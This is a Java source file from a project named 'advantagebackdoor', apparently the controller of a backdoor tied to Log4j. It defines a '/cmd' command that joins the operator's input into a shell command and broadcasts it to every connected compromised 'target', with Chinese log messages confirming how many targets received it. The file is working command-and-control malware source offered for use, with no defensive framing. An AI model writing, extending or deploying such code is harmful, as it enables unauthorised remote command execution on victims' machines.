package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ConsoleCommandMessage;

public class ConsoleCommand extends ServerCommand {
    public ConsoleCommand() {
        super("/cmd", "向目标发送 CMD指令 包");
    }

    @Override
    public void execute(String[] args) {
        String usage = "正确用法: /cmd <CMD指令>";
        if (args.length < 2)
        {
            Log4jServer.getInstance().getLogger().info(usage);
            return;
        }
        String[] nArgs = new String[args.length-1];
        for (int i = 1;i<args.length;i++)
        {
            nArgs[i-1] = args[i];
        }
        String command = "";
        for (String nArg : nArgs) {
            command += nArg + " ";
        }
        command = command.substring(0, command.length()-1);
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(new ConsoleCommandMessage(command));
        }
        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getTargets().size() + " 个目标发送了 CMD指令 包");
    }
}
